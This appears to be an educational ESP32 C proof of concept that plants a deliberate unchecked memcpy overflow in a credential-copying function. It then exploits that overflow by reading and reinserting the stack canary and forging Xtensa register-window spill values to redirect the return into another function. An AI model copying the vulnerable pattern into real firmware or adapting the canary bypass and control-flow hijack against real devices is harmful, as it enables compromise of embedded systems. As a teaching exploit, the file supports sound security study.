/* ESP32 Xtensa Exploit Example

   This example code is in the Public Domain (or CC0 licensed, at your option.)

   Unless required by applicable law or agreed to in writing, this
   software is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR
   CONDITIONS OF ANY KIND, either express or implied.
*/
#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_system.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_log.h"
#include "nvs_flash.h"

#include "lwip/err.h"
#include "lwip/sys.h"
#define TAG "test"

#define MAX_SSID_LEN 20
#define MAX_PASSWORD_LEN 30

struct test
{
    char ssid[MAX_SSID_LEN + 1];
    char pass[MAX_PASSWORD_LEN + 1];
};

struct test *t = NULL;

int copy_to_global(char *ssid, char *pass)
{
	if (t == NULL) {
		struct test *p = malloc(sizeof(struct test)); // malloc() will cause _WindowOverflow8 and later on _WindowUnderflow8 on return from copt_credentials() which loads modified return address from the stack
		if (p == NULL) {
			ESP_LOGE(TAG, "malloc failed");
			return ESP_FAIL;
		}
		memset(p, 0x0, sizeof(*p));
		t = p;
	}
	if (ssid && strlen(ssid) > 2) {
		memcpy(t->ssid, ssid, MAX_SSID_LEN);
	}
	if (pass && strlen(pass) >10) {
		memcpy(t->pass, pass, MAX_PASSWORD_LEN);
	}
	return ESP_OK;
}

int copy_credentials(char *s, char *p)
{
    char ssid[MAX_SSID_LEN + 1]={0};
    char pass[MAX_PASSWORD_LEN + 1]={0};

    if (p == NULL || strlen(p) < 2) {
        ESP_LOGE(TAG, "ssid is NULL");
        return ESP_FAIL;
    } else {
        memcpy(pass, p, strlen(p)); // <<< --- buffer overflow will be here since length is not checked
    }

    if (s == NULL || strlen(s) < 2) {
        ESP_LOGE(TAG, "!ssid is NULL");
        return ESP_FAIL;
    } else {
        memcpy(ssid, s, strlen(s));
    }

    int ret = copy_to_global(ssid, pass);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "copy_to_global failed");
        return ret;
    }
    return ESP_OK; // on return from the function _WindowUnderflow will be called to load saved registers from the stack somewhere to AR[0-64] registers
}

int parse_credentials(char *credentials)
{
    if (!credentials) {
	ESP_LOGE(TAG, "ssid is NULL\n");
	return ESP_FAIL;
    }

    char *s = credentials;

    char *p = strstr(s, "&");
    if (!p) {
	ESP_LOGE(TAG, "ssid was not found\n");
	return ESP_FAIL;
    } *p = '\0'; p++; 

    if (*p == '\0') {
	ESP_LOGE(TAG, "pass was not found\n");
	return ESP_FAIL;
    }

    return copy_credentials(s, p); // on return from the function _WindowUnderflow will be called to load saved registers from the stack somewhere to AR[0-64] registers
}

void print_error(int a)
{
    // The main_task shall not return so which is why while loop is here
    ESP_LOGE(TAG, "%s: First, SHALL NOT BE HERE! Second Argument is equal to %x", __FUNCTION__, a);
}

static int buf[59]; // global array

void start_app(void)
{
    int b;
    char *p; int *pp, c;

    /* According to code the function start buf at offset 20 from curren SP
     *   400d22f2:       18c132          addi    a3, a1, 24 
     * So SP of main_task is located at offset 24+12 = 36 bytes from reserved b */
    int *a= (int)&b; int*sp = a - 6;

    //ESP_LOGE(TAG, "a = %x sp = %x", (int)a, (int)sp);

    //Initialize NVS
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
      ESP_ERROR_CHECK(nvs_flash_erase());
      ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    memset(buf, 'a', sizeof(buf));

    p = (char *) &buf[5];
    *p = '&'; p++;

    /*
     400d22e3:       f75821          ssssss32r    a2, 400d0044 <_flash_cache_start+0x2c>
     400d22e6:       0020c0          memw
     400d22e9:       0228            l32i.n  a2, a2, 0
     400d22eb:       0020c0          memw
     400d22ee:       7129            s32i.n  a2, a1, 28
    */
    a = sp + 7; // steal stack canary

    ESP_LOGE(TAG, "Stack Canary ->>> %x\n", *a);
    c = *a;

    /* We use print_error function as return address however it's not mandatory to use it */
    b = (int)print_error+3; // a0 for app_main
    b = b | 0x80000000; // 31-30 bits of return adddress contains decrease of WindowBase
    b = b & 0xBFFFFFFF; // since main_task was a call of call8 instruction the app will keep b10 for 31-30 bits of return address
    ESP_LOGE(TAG, "Print address function ->>> %x\n", (int)b);


    a = sp - 3; // 3 * 4 bytes - SP for main_task
    ESP_LOGE(TAG, "Stack pointer for main_task function sp %x ->>> %x\n", (int)sp, *a);
    a = sp /* current SP */ + (64 / 4) /* entry   a1, 64 for start_app */; // a1 in app_main (pointer to address of pp[8])

    /* 400d219e:       f159            s32i.n  a5, a1, 60  stack canary placed at offset of +60 bytes from SP */

    /* 400d21b3:       1dc1a2          addi    a10, a1, 29 pass buffer starts from offset 29 bytes from SP */
    /* a10            0x3ffb387d	<< pass buffer */

    p = p + 31; // 60 -29
    *(int*)p = c; // Stack Candary to bypass copy_credentials() stack overflow check
    /* copy_credentials(): 400d219c:       00c136          entry   a1, 96 */
    p = p + 4; // start of 32 byte of stack spill for parse_credentials()
    /* parse_credentials(): 0x400d2278 <+0>:	entry	a1, 32 */
    pp = (int*) p + 8;
    // skip parse_credentials spill area

    // shall be start of start_app stack spill area
    pp[0] = 0xdeadbeef;
    pp[1] = 0xdeadbeef;
    pp[2] = 0xdeadbeef;
    pp[3] = 0xdeadbeef;
    pp[4] = (int)b; //a0
    pp[5] = (int)a; //a1
    pp[6] = 0xdeadbeef;
    pp[7] = 0xdeadbeef;

    // start_app: 0x400d22ec <+0>:	entry	a1, 64

    pp = pp + 8 + ((60 - 32) / 4);
    pp[0] = c;

    a = a + 8; // pointer to address of end of injected exploit

    // shall be start of app_main stack spill area
    // make it cycle // cannot return from here
    pp[1] = 0xdeadbeef;
    pp[2] = 0xdeadbeef;
    pp[3] = 0xdeadbeef;
    pp[4] = 0xdeadbeef;
    pp[5] = (int)b;    // a0
    pp[6] = (int)a;    // a1
    pp[7] = 0xdeadbeef;
    pp[8] = 0xdeadbeef;

    if (((int)a & 0xff) == 0x00) {
	ESP_LOGW(TAG, "Next SP address contains 0x0 = %x. Increase it to 32 bytes.", (int)a);
	a = a + 8;
	ESP_LOGW(TAG, "Next SP address = %x", (int)a);
	pp[6] = (int)a;
	pp = pp + 9 + 8; // extra 8 bytes of garbage to make SP address without 0x0
    } else {
	pp = pp + 9;
    }

    // shall be start of print_error stack spill area
    // in 0rder to make all rest AR registers to be filled with 0xdeadbeef values
    pp[0] = 0xdeadbeef;
    pp[1] = 0xdeadbeef;
    pp[2] = 0xdeadbeef;
    pp[3] = 0xdeadbeef;
    pp[4] = (int)b;    //a0
    pp[5] = (int)a;    //a1
    pp[6] = 0xdeadbeef;
    pp[7] = 0xdeadbeef;

    pp[8] = 0x0;

    (void) parse_credentials((char *)&buf[0]); // on return from the function _WindowUnderflow will be called to load saved registers from the stack somewhere to AR[0-64] registers
}

void app_main(void)
{
    (void) start_app(); // this extra function is needed to return from buffer overflow 3 functions above
    ESP_LOGE(TAG, "%s: SHALL RETURN TO print_error", __FUNCTION__);
    // on return from the function _WindowUnderflow will be called to load saved registers from the stack somewhere to AR[0-64] registers
}
